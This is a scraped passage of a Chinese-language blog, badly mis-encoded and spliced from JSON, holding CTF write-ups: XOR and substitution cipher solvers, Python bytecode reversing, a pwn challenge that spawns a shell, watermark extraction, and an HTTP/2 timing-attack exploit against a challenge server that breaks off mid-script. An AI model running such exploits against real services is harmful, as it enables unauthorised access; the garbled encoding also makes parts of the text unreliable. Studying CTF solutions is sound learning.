4Z8FB!4Pqtst7d'eï¼Œæœ‰ä¸¤ä¸ªä¸åœ¨ string.ascii_letters + string.digits èŒƒå›´å†…çš„å­—ç¬¦ï¼Œäºæ˜¯è€ƒè™‘çˆ†ç ´ä¸€ä¸‹æ‰¾çœŸæ­£çš„ keyã€‚ import string keys = string.ascii_letters + string.digits cipher = 'xxxxxxxx' # 4Z8FB!4Pqtst7d'e for i in keys: key = \"4Z8FB\" + i + \"4Pqtst7due\" r = '' for idx, value in enumerate(cipher): x = chr(value ^ ord(key[idx % 16])) r += x print('====' + i + '====') # print(r) if 'hgame' in r: print(r) ä¸¤ä¸ªä½ç½®éƒ½è¯•ä¸€è¯•ï¼Œæœ€åçœ‹å“ªä¸ªæœ€åˆç†ã€‚ æœ€åå¾—å‡ºæ˜¯ 4Z8FBd4Pqtst7due Symmetry in art is when the elements of a painting or drawing balance each other out. This could be the objects themselves, but it can also relate to colors and other compositional techniques. You may not realize it, but your brain is busy working behind the scenes to seek out symmetry when you look at a painting. There are several reasons for this. The first is that we're hard-wired to look for it. Our ancient ancestors may not have had a name for it, but they knew that their own bodies were basically symmetrical, as were those of potential predators or prey. Therefore, this came in handy whether choosing a mate, catching dinner or avoiding being on the menu of a snarling, hungry pack of wolves or bears! Take a look at your face in the mirror and imagine a line straight down the middle. You'll see both sides of your face are pretty symmetrical. This is known as bilateral symmetry and it's where both sides either side of this dividing line appear more or less the same. So here is the flag: hgame{X0r_i5-a_uS3fU1+4nd$fUNny_C1pH3r} ç„¶åå‘ç°è¿™ä¸ªå±…ç„¶çœŸçš„æœ‰åŸæ–‡ï¼Œå°±æ˜¯ å¯¹ç§°ä¹‹ç¾ï¼ˆSymmetry in Artï¼‰ï¼Œè¯¦è§ 5 Reasons Why We Love Symmetry in Art so Much (And How You Can Use This Research to Create Even More Awesome Paintings) Transformer æ‰€æœ‰äººéƒ½å·²åšå¥½å‡†å¤‡,æœˆé»‘ä¹‹æ—¶å³å°†æ¥ä¸´,ä¸ºäº†å‡»æ¯æœ€åçš„ä¸»æ§èƒ½é‡æŸ±,æ‰“å¼€é€šå¾€èŠåŠ å“¥çš„å‡é™æ¡¥è¿«åœ¨çœ‰ç« çœ‹å®ˆå‡é™æ¡¥çš„æ§åˆ¶å‘˜å·²ç»å¤±è¸ª,å”¯æœ‰åœ¨æ§åˆ¶å°çš„å°æˆ¿é—´ç•™ä¸‹æ¥çš„å°çº¸æ¡,ä¼¼ä¹æ˜¯æ§åˆ¶å‘˜é˜²æ­¢è‡ªå·±è€äº†æŠŠå¯†ç å¿˜è®°è€Œå†™ä¸‹çš„,ä½†ä¼¼ä¹éƒ½æ˜¯å¥‡æ€ªçš„å­—æ¯ç»„åˆ,å”¯ä¸€æœ‰ä»·å€¼çš„çº¿ç´¢æ˜¯åƒåœ¾æ¡¶é‡Œçš„ä¸¤å †è¢«ç¢çº¸æœºç²‰ç¢çš„ç¢çº¸,éšä¾¿æŸ¥çœ‹å‡ å¼ ,ä¼¼ä¹æ˜¯ä¸¤ä»½æ–‡ä»¶,å¹¶ä¸”å…¶ä¸­ä¸€ä»½å’Œå°çº¸æ¡ä¸Šçš„å­—æ¯è§„å¾‹æœ‰ç‚¹ç›¸åƒ é™„ä»¶md5:0340142700c8f63546368fa14fd6fb24 https://1.oss.hgame2021.vidar.club/Transformer.zip \\ Transformer.txt: Tqh ufso mnfcyh eaikauh kdkoht qpk aiud zkhc xpkkranc uayfi kfieh 2003, oqh xpkkranc fk \"qypth{hp5d_s0n_szi^3ic&amp;qh11a_}\",Dai'o sanyho oa pcc oqh dhpn po oqh hic. å¾ˆæ˜æ˜¾è¿™ä¸ªå°±æ˜¯å¯†æ–‡äº†ï¼Œflag å°±è—åœ¨è¿™ä¸ªé‡Œé¢äº†ã€‚ ç„¶åç»™äº† ori å’Œ encï¼ŒåŸæ–‡å’Œå¯†æ–‡ï¼Œéšæ„çœ‹äº†ä¸€ä¸‹è¿˜æ‰“ä¹±é¡ºåºäº†ï¼Œåè€¶ã€‚ ä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œå‘ç°æ˜¯å¯¹ç§°åŠ å¯†ï¼Œè€Œä¸”åªæ˜¯å°å†™å­—æ¯è¿›è¡Œäº†å¯¹æ¢ï¼Œå…¶ä»–å­—ç¬¦éƒ½ä¸å˜ã€‚ é‚£ç›´æ¥æ‰¾è¶³å¤Ÿå¤šçš„æ ·æœ¬ï¼Œå¾—åˆ°æ˜ å°„å…³ç³»å°±å®Œäº‹äº†ã€‚ payload æœ‰ç‚¹ä¹±ï¼Œå¤§æ¦‚æ€è·¯é¦–å…ˆæ˜¯æ‰¾å‡ ä¸ªæ ·æœ¬ï¼Œç„¶åæ ¹æ®æ ·æœ¬å¾—åˆ°åŒ¹é…å¯¹ pairï¼Œæœ€åè§£å¯†ã€‚ import os import string os.chdir(os.path.dirname(os.path.realpath(__file__))) # base_dir = \"enc/\" base_dir = \"ori/\" filenames = os.listdir(base_dir) for filename in filenames: with open(base_dir + filename, 'r', encoding='utf-8') as f: content = f.read() # if \"â€™\" in content: # if 'b' in content and 'l' in content: if content[5] == ' ': print(filename) print(content) print('=====') ori1 = \"\"\"hat you want but it will be â€œcorrectâ€. anotrogram correctnessâ€ and many gstance. rust offers a form of â€œp me; we donâ€™t have to worry about the from runtime checking of constraints and invariants; mpile times to be pretty beefy; our cpus a memory safety; it definitely excites us kno duction for the last few years and weâ€™ve if youâ€™re new to rust, start small and build started this project. weâ€™ve bee ntial localization implementation to meet the require \"\"\" enc1 = \"\"\"qpo daz rpio mzo fo rfuu mh â€œeannheoâ€. piaonaynpt eannheoihkkâ€ pic tpid ykopieh. nzko asshnk p sant as â€œx th; rh caiâ€™o qpvh oa rannd pmazo oqh snat nziofth eqhejfiy as eaikonpfiok pic fivpnfpiok; txfuh ofthk oa mh xnhood mhhsd; azn exzk p thtand kpshod; fo chsfifohud hgefohk zk jia czeofai san oqh upko shr dhpnk pic rhâ€™vh fs dazâ€™nh ihr oa nzko, kopno ktpuu pic mzfuc kopnohc oqfk xnawheo. rhâ€™vh mhh iofpu uaepufbpofai ftxuhthiopofai oa thho oqh nhlzfnh \"\"\" pair = {} for idx, value in enumerate(enc1): pair[value] = ori1[idx] print(pair) # {'q': 'h', 'p': 'a', 'o': 't', ' ': ' ', 'd': 'y', 'a': 'o', 'z': 'u', 'r': 'w', 'i': 'n', 'm': 'b', 'f': 'i', 'u': 'l', 'h': 'e', 'â€œ': 'â€œ', 'e': 'c', 'n': 'r', 'â€': 'â€', '.': '.', '\\n': '\\n', 'y': 'g', 't': 'm', 'k': 's', 'c': 'd', 's': 'f', 'x': 'p', ';': ';', 'â€™': 'â€™', 'v': 'v', 'j': 'k', 'g': 'x', ',': ',', 'w': 'j', 'b': 'z', 'l': 'q'} s=\"\"\"Tqh ufso mnfcyh eaikauh kdkoht qpk aiud zkhc xpkkranc uayfi kfieh 2003, oqh xpkkranc fk \"qypth{hp5d_s0n_szi^3ic&amp;qh11a_}\",Dai'o sanyho oa pcc oqh dhpn po oqh hic.\"\"\" r = '' for i in s: if i in string.ascii_lowercase: r += pair[i] else: r += i # print(r) print(r) # The lift bridge console system has only used password login since 2003, the password is \"hgame{ea5y_f0r_fun^3nd&amp;he11o_}\",Don't forget to add the year at the end. æœ€åå†åŠ ä¸Šå¹´ä»½ hgame{ea5y_f0r_fun^3nd&amp;he11o_2021} Reversepypyç»™äº† dis.dis human readable çš„å­—èŠ‚ç ï¼Œç›´æ¥é€†å‘ä¸€ä¸‹å°±å®Œäº‹äº†ã€‚ 4 0 LOAD_GLOBAL 0 (input) 2 LOAD_CONST 1 ('give me your flag:\\n') 4 CALL_FUNCTION 1 6 STORE_FAST 0 (raw_flag) 5 8 LOAD_GLOBAL 1 (list) 10 LOAD_FAST 0 (raw_flag) 12 LOAD_CONST 2 (6) 14 LOAD_CONST 3 (-1) 16 BUILD_SLICE 2 18 BINARY_SUBSCR 20 CALL_FUNCTION 1 22 STORE_FAST 1 (cipher) 6 24 LOAD_GLOBAL 2 (len) 26 LOAD_FAST 1 (cipher) 28 CALL_FUNCTION 1 30 STORE_FAST 2 (length) 8 32 LOAD_GLOBAL 3 (range) 34 LOAD_FAST 2 (length) 36 LOAD_CONST 4 (2) 38 BINARY_FLOOR_DIVIDE 40 CALL_FUNCTION 1 42 GET_ITER &gt;&gt; 44 FOR_ITER 54 (to 100) 46 STORE_FAST 3 (i) 9 48 LOAD_FAST 1 (cipher) 50 LOAD_CONST 4 (2) 52 LOAD_FAST 3 (i) 54 BINARY_MULTIPLY 56 LOAD_CONST 5 (1) 58 BINARY_ADD 60 BINARY_SUBSCR 62 LOAD_FAST 1 (cipher) 64 LOAD_CONST 4 (2) 66 LOAD_FAST 3 (i) 68 BINARY_MULTIPLY 70 BINARY_SUBSCR 72 ROT_TWO 74 LOAD_FAST 1 (cipher) 76 LOAD_CONST 4 (2) 78 LOAD_FAST 3 (i) 80 BINARY_MULTIPLY 82 STORE_SUBSCR 84 LOAD_FAST 1 (cipher) 86 LOAD_CONST 4 (2) 88 LOAD_FAST 3 (i) 90 BINARY_MULTIPLY 92 LOAD_CONST 5 (1) 94 BINARY_ADD 96 STORE_SUBSCR 98 JUMP_ABSOLUTE 44 12 &gt;&gt; 100 BUILD_LIST 0 102 STORE_FAST 4 (res) 13 104 LOAD_GLOBAL 3 (range) 106 LOAD_FAST 2 (length) 108 CALL_FUNCTION 1 110 GET_ITER &gt;&gt; 112 FOR_ITER 26 (to 140) 114 STORE_FAST 3 (i) 14 116 LOAD_FAST 4 (res) 118 LOAD_METHOD 4 (append) 120 LOAD_GLOBAL 5 (ord) 122 LOAD_FAST 1 (cipher) 124 LOAD_FAST 3 (i) 126 BINARY_SUBSCR 128 CALL_FUNCTION 1 130 LOAD_FAST 3 (i) 132 BINARY_XOR 134 CALL_METHOD 1 136 POP_TOP 138 JUMP_ABSOLUTE 112 15 &gt;&gt; 140 LOAD_GLOBAL 6 (bytes) 142 LOAD_FAST 4 (res) 144 CALL_FUNCTION 1 146 LOAD_METHOD 7 (hex) 148 CALL_METHOD 0 150 STORE_FAST 4 (res) 16 152 LOAD_GLOBAL 8 (print) 154 LOAD_CONST 6 ('your flag: ') 156 LOAD_FAST 4 (res) 158 BINARY_ADD 160 CALL_FUNCTION 1 162 POP_TOP 164 LOAD_CONST 0 (None) 166 RETURN_VALUE # your flag: 30466633346f59213b4139794520572b45514d61583151576638643a ç„¶åç…§æ ·å­å†™å‡ºæºç ã€‚ # # æºä»£ç  # hgame{.+} raw_flag = input('give me your flag:\\n') cipher = list(raw_flag[6:-1]) length = len(cipher) for i in range(length // 2): cipher[2*i], cipher[2 * i + 1] = cipher[2 * i + 1], cipher[2*i] res=[] for i in range(length): res.append(ord(cipher[i]) ^ i) res = bytes(res).hex() print('your flag: ' + res) # your flag: 30466633346f59213b4139794520572b45514d61583151576638643a å¥½è€¶ï¼Œç›´æ¥å°±æ˜¯å¥‡å¶ä½äº¤æ¢ï¼Œç„¶åå¼‚æˆ–ä¸€ä¸‹ï¼Œé‚£ç›´æ¥åè¿‡æ¥å°±å®Œäº‹äº†ã€‚ exp: # decode res = '30466633346f59213b4139794520572b45514d61583151576638643a' x = bytes.fromhex(res) length = len(x) cipher = [] for i in range(length): cipher.append(chr(x[i] ^ i)) for i in range(length // 2): cipher[2*i], cipher[2 * i + 1] = cipher[2 * i + 1], cipher[2*i] print(cipher) flag = ''.join(cipher) print(flag) # G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~ hgame{G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~} Extensive Reading: ï¼ˆæ•´ç†ï¼‰Pythonå­—èŠ‚ç è¯¦è§£ helloReå…³é”®çš„éƒ¨åˆ†åœ¨ä¸‹å›¾çš„ç¬¬39è¡Œã€‚ é¦–å…ˆè¯»å–è¾“å…¥ï¼Œç„¶åä¸ sub_140001430 å‡½æ•°è¿”å›çš„ç»“æœè¿›è¡Œå¼‚æˆ–ï¼Œä¸å¯¹åˆ™è¾“å‡º wrong flagã€‚ å†çœ‹ sub_140001430ï¼Œè¿”å›çš„æ˜¯ 0xFF é€’å‡çš„ç»“æœã€‚ è€Œ byte_140003480 æ˜¯æ¯”å¯¹çš„éƒ¨åˆ†ã€‚ äºæ˜¯å†™ä¸ªè„šæœ¬å¼‚æˆ–å°±å®Œäº‹äº†ã€‚ Exp: xx = \"\"\"97 99 ...\"\"\" x = xx.strip().split('\\n') x = [int(i.strip(), 16) for i in x] r = '' cnt = 0xff for i in x: r += chr(i ^ cnt) cnt -= 1 print(r) # hgame{hello_re_player} Pwnwhitegiveç­¾åˆ°é¢˜ï¼Œæºç éƒ½ç»™äº†ï¼Œå¥½è€¶ï¼ #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; void init_io() { setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL); } int main() { unsigned long long num; init_io(); printf(\"password:\"); scanf(\"%ld\", &amp;num); if (num == \"paSsw0rd\") { //Do you know strcmp? printf(\"you are right!\\n\"); system(\"/bin/sh\"); } else { printf(\"sorry, you are wrong.\\n\"); } return 0; } unsigned long long å’Œ char* æ¯”è¾ƒï¼Œçœ‹æŒ‡é’ˆåœ°å€å°±å¥½äº†ã€‚ 0x402012 =&gt; 4202514 hgame{W3lCOme_t0_Hg4m3_2222Z222zO2l} å°ç»“ç¬¬ä¸€å‘¨ AK äº† Misc å’Œ Webï¼Œæ„Ÿè§‰é¢˜ç›®è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚ å–µå‘œï¼Œbinary å¥½éš¾ä¸ä¼šåšï¼Œå˜¤å˜¤å˜¤ã€‚ å¥½å¿«å•Šï¼Œè¿™å‘¨å°±è¿‡å¹´äº†å–µ~ ï¼ˆæºœäº†æºœäº†","path":"2021/02/07/CTF_2021HgameWeek1/"},{"title":"CTF | 2021 æ˜¥ç§‹æ¯ æ–°å¹´æ¬¢ä¹èµ› WriteUp","text":"å¼•è¨€å‰å‡ å¤©æœ‰ä¸ª 2021å¹´â€œæ˜¥ç§‹æ¯â€æ–°å¹´æ¬¢ä¹èµ›ï¼Œæ€»å…±æœ‰ 10 é“é¢˜ï¼Œé¢˜ç›®ä¸åˆ† misc/web/crypto/pwn/reverse/â€¦ï¼Œç»Ÿç§° Fungameã€‚ é¢˜ç›®ç”±2020å¹´æŠ€æœ¯çƒ­ç‚¹äº‹ä»¶ç±»å‹é¢˜ç›®ã€å¸¸è§„è€ƒç‚¹é¢˜ç›®ä»¥åŠä»¥å¾€æ¯”èµ›0è§£ä¸”æœªå…¬å¼€writeupçš„é¢˜ç›®ç»„æˆã€‚ æœ¬æ¬¡æ¯”èµ›å°†é‡‡ç”¨å…¨æ–°çš„æ²™æ¼ç§¯åˆ†æ¨¡å¼ï¼Œæ²™æ¼ç§¯åˆ†æ¨¡å¼æ˜¯ä¸€ç§é¢˜ç›®åˆ†å€¼éšç€æ—¶é—´çš„å¢åŠ è€Œé€æ¸å‡å°‘çš„ç§¯åˆ†æ¨¡å¼ï¼Œè¯¥ç§¯åˆ†æ¨¡å¼çš„è®¾å®šç›®çš„æ˜¯ä¸ºäº†æ¿€åŠ±é€‰æ‰‹äº‰å¤ºæ—¶é—´ç­”é¢˜ï¼Œæé«˜CTFæ¯”èµ›çš„ç«æŠ€æ€§ã€‚æ²™æ¼ç§¯åˆ†æ¨¡å¼ä¸‹ï¼Œé¢˜ç›®åˆ†å€¼çš„ä¸‹é™ä¸ä¼šå½±å“åˆ°ä¹‹å‰å¾—åˆ†è€…ã€‚ æ¯”èµ›æ—¶é—´ï¼š2021å¹´1æœˆ29æ—¥10:00-1æœˆ31æ—¥17:00 ç§¯åˆ†å•¥çš„ä¸å…³é”®ï¼Œå€’æ˜¯å¯¹é¢˜ç›®æœ‰ç‚¹æ„Ÿå…´è¶£å°±æ¥çœ‹çœ‹äº†ã€‚ è¯´å¥½çš„æ¬¢ä¹èµ›ï¼Œå…¶å®ä¸€ç‚¹éƒ½ä¸æ¬¢ä¹ï¼Œå¤ªåäº†ï¼ è¿™é‡Œéšæ„å†™å†™ WriteUp å¥½äº†ã€‚ ç­¾åˆ° ä¸‡ç‰©çš†æœ‰â€FUNâ€ï¼Œç”µè„‘æ‰«â€FUNâ€æ´»åŠ¨ï¼Œæä¾›å¤§å†™çš„â€FUNâ€å­—æ ·ï¼Œå³å¯è·å–flag~ ï¼ˆå±…ç„¶è°ƒç”¨äº†æ‘„åƒå¤´ ç›²çŒœæ˜¯è¯†åˆ«åˆ° FUN å°±å‡º flag äº†å§ã€‚ ç”šè‡³è¿˜ä¿å­˜äº†ä¸€ä»½ flag.txt åˆ°ç›®å½•ä¸‹ 233. flag{ju5t_f0r_FUN} åäºŒå®«çš„æŒ‘è¡… ä½†æ„¿ä½ èƒ½è§£å‡ºå¯†æ–‡ï¼Œä¸ç„¶æˆ‘å°±ä¼šç»§ç»­çŠ¯ç½ª:) æœ¬é¢˜è·å–flagæäº¤å‰è¯·åŠ ä¸Šflag{} é¦–å…ˆæŠ„äº†ä¸€ä»½ã€‚ã€‚ ^#@$@#()/&gt;@?==%1( !)&gt;(*+3&lt;#86@-7$^. 4&amp;)8%#5&amp;6!=%1#$-$ +5&amp;?#!.03!%=@=101 0?(*~#??.+)%&amp;.7^8 =1%*^=$5$7@@8&gt;&amp;*9 9@0185(+7)&lt;%3#@^4 &amp;@@&lt;.)$3*#%%&lt;&lt;*++ .@.?=~**+!==65^@&amp; æŸ¥äº†ä¸€ä¸‹ é»„é“åäºŒå®«æ€æ‰‹ï¼Œå¯ä»¥çœ‹åˆ°å»å¹´12æœˆå¯†ç ä¿¡340 è¢«ç ´è§£çš„æ–°é—»ã€‚ å½“ç„¶è¿˜æœ‰è§£å¯†çš„è§†é¢‘ï¼ŒLetâ€™s Crack Zodiac - Episode 5 - The 340 Is Solved!ï¼ˆYoutubeï¼‰ æˆ–è€… é»„é“åäºŒå®«æ€æ‰‹çš„å¯†ç ä¿¡ã€Œ340ã€æ˜¯æ€ä¹ˆè¢«ç ´è§£çš„ ï¼ˆBç«™æ¬è¿ï¼ŒåŒä¸Šï¼‰ å†æˆ–è€… é»„é“åäºŒå®«è¿ç¯æ€æ‰‹å¯†ç ç ´è¯‘å…¨è¿‡ç¨‹ï¼ˆBç«™æ¬è¿ï¼Œå¸¦ç¿»è¯‘ï¼‰ æŒ‰ç…§è§†é¢‘é‡Œçš„è§£å¯†æ–¹æ³•ï¼Œä¾æ¬¡é”™ä½å¾€ä¸‹è¯»å–å¾—åˆ°ä»¥ä¸‹å­—ç¬¦ã€‚ ï¼ˆæ‰‹è§£çš„å¥½ç´¯ï¼Œå¯»æ€ç€è¿˜ä¸å¦‚å†™ä¸ªè„šæœ¬ï¼Œåšä¸ªå¾ªç¯å†å–ä¸ªæ¨¡å°±å¥½äº†å–µ ^&gt;%..@3*&amp;#(#0+@#+ .@*53)8@+@$+&amp;!%&gt;^ &amp;.@36%&amp;&amp;4@?#&lt;!=.* 9@=(#=@79@&lt;~)8%=^ =0.*/611811)*&gt;@#0 0%8$+@-$1?*53!?7- +(^(*==$$5*=+#==^ 4&amp;~$7%6%.&amp;?#5)%51 !)#?$&lt;&lt;^()8!?7%&lt;@ å†ä¸¢åˆ° AZdecrypt è¿™ä¸ªè½¯ä»¶ é‡Œå»è§£å¯†ï¼Œå‡ ç§’é’Ÿå°±å‡ºæ¥äº†ã€‚ è‰ï¼Œè¿™å°±æ˜¯ flag å•Šï¼ IKILLED A LOT OF PEOPLE AND THE PEOPLE I KILLED WILL BECOME SLAVES TO SERVE ME THIS IS FLAG WUUHUU TAKE OFF I HOPE YOU CAN DECRYPT IT AS SOON AS POSSIBLE OR I WILL CONTINUE TO COMMIT THE CRIME æœ€åå‘ç°æäº¤çš„æ—¶å€™è¦è¿èµ·æ¥ã€‚ flag{WUUHUUTAKEOFF} snowww Itâ€™s really cold this winter, can you find what is hidden in snow å°¾éƒ¨æ‹¼æ¥äº†ä¸€ä¸ª rarï¼Œæå–å‡ºæ¥ï¼Œå¾—åˆ° MATLAB æºä»£ç å’Œæ•°æ®ã€‚ encode.m: %% Run on Matlab2012b clc;clear;close all; alpha = 80; im = double(imread('original.jpg'))/255; mark = double(imread('watermark.png'))/255; imsize = size(im); TH=zeros(imsize(1)*0.5,imsize(2),imsize(3)); TH1 = TH; TH1(1:size(mark,1),1:size(mark,2),:) = mark; M=randperm(0.5*imsize(1)); N=randperm(imsize(2)); save('encode.mat','M','N'); for i=1:imsize(1)*0.5 for j=1:imsize(2) TH(i,j,:)=TH1(M(i),N(j),:); end end mark_ = zeros(imsize(1),imsize(2),imsize(3)); mark_(1:imsize(1)*0.5,1:imsize(2),:)=TH; for i=1:imsize(1)*0.5 for j=1:imsize(2) mark_(imsize(1)+1-i,imsize(2)+1-j,:)=TH(i,j,:); end end FA=fft2(im); FB=FA+alpha*double(mark_); FAO=ifft2(FB); imwrite(FAO,'snow.jpg'); å™¢ï¼Œæ˜¯é¢‘åŸŸéšå†™äº†ç›²æ°´å°å•Šã€‚ å¯ä»¥çœ‹åˆ°æœ€åè¿›è¡Œäº† FFT å¤„ç†ï¼ŒM, N æ•°æ®ä¹Ÿéƒ½ç»™äº†ï¼Œç„¶åé€†å›å»å†™è„šæœ¬å°±å¥½äº†ã€‚ å¦å¤–æ³¨æ„åˆ° mark_ ç¬¬ä¸€ç»´çš„å‰åŠéƒ¨åˆ†å’ŒååŠéƒ¨åˆ†æ˜¯å†—ä½™çš„ï¼Œéšä¾¿å–ä¸€éƒ¨åˆ†å°±å¥½äº†ã€‚ Payload: % Author: MiaoTony % Blog: https://miaotony.xyz clc;clear;close all; alpha = 80; im = double(imread('original.jpg'))/255; snow = double(imread('00000000.jpg'))/255; imsize = size(im); FA=fft2(im); FC=fft2(snow); mark_ = real((FC-FA)/alpha); TH = mark_(1:imsize(1)*0.5,1:imsize(2),:); TH1=zeros(imsize(1)*0.5,imsize(2),imsize(3)); load('encode.mat'); for i=1:imsize(1)*0.5 for j=1:imsize(2) TH1(M(i),N(j),:)=TH(i,j,:); end end imshow(TH1); imwrite(TH1,'mark.jpg'); å¾—åˆ° mark å›¾ç‰‡ï¼Œå›¾ç‰‡æœ‰ç‚¹é»‘ï¼Œä½† flag æŒºæ¸…æ¥šäº†ï¼Œé—®é¢˜ä¸å¤§ã€‚ flag{c93fd2a3-103f-4539-9a51-ad5a6437daa1} å™¢ï¼ŒåŸæ¥ Bä¹ä¸Šæœ‰æ–‡ç« ä»‹ç»å•Š emmm è¿˜æ˜¯2016å¹´çš„äº‹äº†ã€‚ é˜¿é‡Œå·´å·´å…¬å¸æ ¹æ®æˆªå›¾æŸ¥åˆ°æ³„éœ²ä¿¡æ¯çš„å…·ä½“å‘˜å·¥çš„æŠ€æœ¯æ˜¯ä»€ä¹ˆï¼Ÿ borrow_time I wanna borrow some time. [æ³¨ï¼šæƒ³æ³•å­è®¿é—®åˆ°é¢˜ç›®ï¼ŒåŠ æ²¹ã€‚æœ¬é¢˜æ¯éš”30åˆ†é’Ÿè‡ªåŠ¨é‡ç½®ã€‚] http://8.140.110.118/ ç›´æ¥è®¿é—®å¾—åˆ°çš„æ˜¯ä¸€ä¸² bit æµï¼Œemmm ä»€ä¹ˆç©æ„ã€‚ ç„¶åç”¨ curlï¼Œå‘ç°è®©æˆ‘ç”¨ HTTP0.9??? è®¿é—®å¾—åˆ°ä¸‹é¢çš„ï¼Œå°±æ˜¯é‚£ä¸² bit æµã€‚ $ nc 8.140.110.118 80 | hexdump -C miaotony.xyz 00000000 00 00 12 04 00 00 00 00 00 00 03 00 00 00 80 00 |................| 00000010 04 00 01 00 00 00 05 00 ff ff ff 00 00 04 08 00 |................| è¯•äº†ä¸€ä¸‹å‘ç°è¿™ä¸ªæ˜¯ HTTP2ï¼Œä½†æ˜¯æµè§ˆå™¨ä¸€èˆ¬éƒ½æ˜¯ä» HTTP1.1 åå•†å‡çº§åˆ° HTTP2 çš„è€Œä¸æ˜¯ç›´æ¥è¯·æ±‚ HTTP2çš„ï¼Œäºæ˜¯å°±è®¿é—®ä¸åˆ°äº†ã€‚ å…·ä½“å¯ä»¥çœ‹ä¸‹é¢çš„å¯¹æ¯”ã€‚ # curl --http2-prior-knowledge http://8.140.110.118/ -v * Trying 8.140.110.118:80... * Connected to 8.140.110.118 (8.140.110.118) port 80 (#0) * Using HTTP2, server supports multi-use * Connection state changed (HTTP/2 confirmed) * Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0 * Using Stream ID: 1 (easy handle 0x2795195f000) &gt; GET / HTTP/2 &gt; Host: 8.140.110.118 &gt; user-agent: curl/7.73.0 &gt; accept: */* &gt; * Connection state changed (MAX_CONCURRENT_STREAMS == 128)! &lt; HTTP/2 200 &lt; server: nginx/1.17.10 &lt; date: Sat, 30 Jan 2021 11:29:47 GMT &lt; content-type: text/html; charset=utf-8 &lt; content-length: 505 &lt; &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/static/login.css\"/&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"login\"&gt; &lt;h1&gt;Login&lt;/h1&gt; &lt;form method=\"post\"&gt; &lt;input type=\"password\" required=\"required\" placeholder=\"å£ä»¤\" name=\"secret\"&gt;&lt;/input&gt; &lt;button class=\"but\" type=\"submit\"&gt;ç™»å½•&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; &lt;!-- /src --&gt;* Connection #0 to host 8.140.110.118 left intact è®¿é—® /src å¾—åˆ°æºç ï¼š #!/usr/bin/env python import os import time import hashlib from flask import Flask, render_template, request app = Flask(__name__) FLAG = os.environ[\"ICQ_FLAG\"] SECRET = hashlib.sha1(FLAG.encode()).hexdigest()[:10] SLEEP_TIME = 10 ** -10 @app.route(\"/\", methods=['POST', 'GET']) def login(): if request.method == 'GET': return render_template('login.html') else: secret = request.form['secret'] if len(secret) != len(SECRET): return \"^_^\" for a, b in zip(secret, SECRET): if a == \"*\": continue elif a != b: return \"INCORRECT\" else: time.sleep(SLEEP_TIME) if \"*\" in secret: return \"INCORRECT\" return FLAG @app.route(\"/src\") def src(): with open(__file__) as f: return f.read() äºæ˜¯å°±æ˜¯åŸºäºæ—¶é—´çš„ç›²æ³¨äº†å§ï¼Œæ¯ä¸€ä½çš„å­—ç¬¦å¯ä»¥å•ç‹¬è¿›è¡Œéå†ï¼Œæ­£åˆé¢˜æ„ borrow timeã€‚ ç„¶åå‘ç°äº†ç±»ä¼¼çš„é¢˜ç›®ï¼Œå°±æ˜¯ WCTF 2020 ä¸€é“é¢˜ç›®æ”¹çš„ã€‚ å‚è€ƒï¼š https://github.com/ConnorNelson/spaceless-spacing https://github.com/DistriNet/timeless-timing-attacks è¿™é“é¢˜æŠŠ GET æ”¹æˆ POST äº†ï¼Œè·³è¿‡çš„å­—ç¬¦ç”± ï¼ˆç©ºæ ¼ï¼‰æ”¹æˆäº† *ï¼Œéœ€è¦æ”¹ä¸€ä¸‹ exploitã€‚ è¿™ä¸ª TIMING_ITERATIONSï¼ŒNUM_REQUEST_PAIRS éœ€è¦æ”¹å¤§ä¸€ç‚¹ï¼Œä¸ç„¶ä¸¤ä¸ªè¯·æ±‚åŒæ—¶å‘å‡ºå»æ²¡å•¥åŒºåˆ«â€¦â€¦ ä»¥åŠ http://8.140.110.118:80 è¦æŠŠç«¯å£ç»™æŒ‡å®šå¥½ï¼Œé€šè¿‡å®¡è®¡æºç å‘ç° H2Request å’Œ HTTP20Connection é‡Œé¢æ¥å£å°è£…çš„ä¸ä¸€æ ·ï¼Œä¼šæœ‰ç‚¹é—®é¢˜ï¼Œæˆ–è€…ä¼ ä¸ª port å‚æ•°è¿›å»ä¹Ÿå¯ã€‚ Payload: (h2time å‚è€ƒä¸Šé¢çš„ repo) import os import asyncio import time import string import logging from hyper import HTTP20Connection from h2time import H2Time, H2Request # Number of requests: TIMING_ITERATIONS * NUM_REQUEST_PAIRS * 2 * |SECRET_CHARSET| * |SECRET| TIMING_ITERATIONS = 2 # 3 NUM_REQUEST_PAIRS = 20 # 20 SECRET_CHARSET = 'abcdef' + string.digits COMPARISON_CHAR = \"x\" # This must not be in SECRET_CHARSET # target = os.environ[\"TARGET\"].rstrip(\"/\") target = \"http://8.140.110.118:80\" logging.basicConfig(level=logging.INFO) logger = logging.getLogger(\"exploit\") def get(resource): logging.disable(logging.INFO) try: connection = HTTP20Connection( target.lstrip(\"http://\").lstrip(\"https://\")) # , port=80 connection.request( \"POST\", \"/\", body=f\"secret={resource}\", headers={\"user-agent\": \"curl/7.73.0\", \"content-type\": \"application/x-www-form-urlencoded\"}) return connection.get_response().read() finally: logging.disable(logging.DEBUG) async def time_difference(a, b): request_a = H2Request(\"POST\", f\"{target}/\", headers={\"user-agent\": \"curl/7.73.0\", \"content-type\": \"application/x-www-form-urlencoded\"}, data=f\"secret={a}\") request_b = H2Request(\"POST\", f\"{target}/\", headers={\"user-agent\": \"curl/7.73.0\", \"content-type\": \"application/x-www-form-urlencoded\"}, data=f\"secret={b}\") a_quicker_count = 0 b_quicker_count = 0 for _ in range(TIMING_ITERATIONS): async with H2Time( request_a, request_b, num_request_pairs=NUM_REQUEST_PAIRS ) as h2t: results = await h2t.run_attack() b_quicker_count += len([result for result in results if result[0] &lt; 0]) a_quicker_count += len([result for result in results if result[0] &gt;= 0]) async with H2Time( request_b, request_a, num_request_pairs=NUM_REQUEST_PAIRS ) as h2t: results = await h2t.run_attack() a_quicker_count += len([result for result in results if result[0] &lt; 